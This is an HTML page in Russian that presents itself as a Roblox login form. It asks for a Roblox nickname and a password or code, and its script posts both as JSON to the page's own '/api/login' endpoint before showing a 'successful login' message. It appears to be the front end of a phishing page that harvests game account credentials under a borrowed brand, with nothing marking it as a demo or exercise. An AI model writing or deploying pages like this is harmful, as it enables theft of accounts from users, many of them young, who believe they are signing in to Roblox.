<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вход в Roblox</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #333; border-radius: 6px; background: #2c2c2c; color: #fff; box-sizing: border-box; }
        button { background: #0084ff; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #006dd6; }
        #status { margin-top: 15px; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Вход в Roblox</h2>
        <input type="text" id="usernameInput" placeholder="Ник в Roblox">
        <input type="password" id="passwordInput" placeholder="Пароль / Код">
        <button onclick="loginUser()">Войти</button>
        <div id="status"></div>
    </div>

    <script>
        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ff4d4d';
                statusDiv.innerText = 'Заполните все поля!';
                return;
            }

            statusDiv.style.color = '#ccc';
            statusDiv.innerText = 'Отправка данных...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#4bb543';
                    statusDiv.innerText = 'Успешный вход!';
                } else {
                    statusDiv.style.color = '#ff4d4d';
                    statusDiv.innerText = data.error || 'Ошибка входа';
                }
            } catch (err) {
                statusDiv.style.color = '#ff4d4d';
                statusDiv.innerText = 'Ошибка соединения';
            }
        }
    </script>

</body>
</html>
